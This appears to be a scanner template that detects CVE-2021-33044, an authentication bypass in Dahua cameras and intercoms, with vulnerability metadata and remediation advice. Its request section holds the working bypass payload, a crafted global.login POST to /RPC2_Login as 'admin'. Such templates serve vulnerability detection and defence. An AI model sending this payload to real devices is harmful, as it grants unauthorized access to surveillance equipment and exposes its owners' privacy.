id: CVE-2021-33044
info:
  name: Dahua IPC/VTH/VTO - Authentication Bypass
  author: gy741
  description: Some Dahua products contain an authentication bypass during the login
    process. Attackers can bypass device identity authentication by constructing malicious
    data packets.
  severity: critical
  impact: 'An attacker can gain unauthorized access to the device, potentially compromising
    the security and privacy of the system.

    '
  remediation: 'Apply the latest firmware update provided by Dahua to fix the authentication
    bypass vulnerability.

    '
  reference:
  - https://github.com/dorkerdevil/CVE-2021-33044
  - https://nvd.nist.gov/vuln/detail/CVE-2021-33044
  - https://seclists.org/fulldisclosure/2021/Oct/13
  - https://www.dahuasecurity.com/support/cybersecurity/details/957
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-33044
    cwe-id: CWE-287
    epss-score: 0.29051
    epss-percentile: 0.96446
    cpe: cpe:2.3:o:dahuasecurity:ipc-hum7xxx_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: dahuasecurity
    product: ipc-hum7xxx_firmware
  tags: cve2021,cve,dahua,auth-bypass,seclists,dahuasecurity
traps:
- request:
    method: POST
    path: /RPC2_Login
    headers:
      Accept: application/json, text/javascript, */*; q=0.01
      Connection: close
      X-Requested-With: XMLHttpRequest
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      Origin: '{{BaseURL}}'
      Referer: '{{BaseURL}}'
    body: '{"id": 1, "method": "global.login", "params": {"authorityType": "Default",
      "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used",
      "passwordType": "Default", "userName": "admin"}, "session": 0}

      '
  response:
    status_code: 200
    headers: {}
    body: '"result":trueidparamssession'
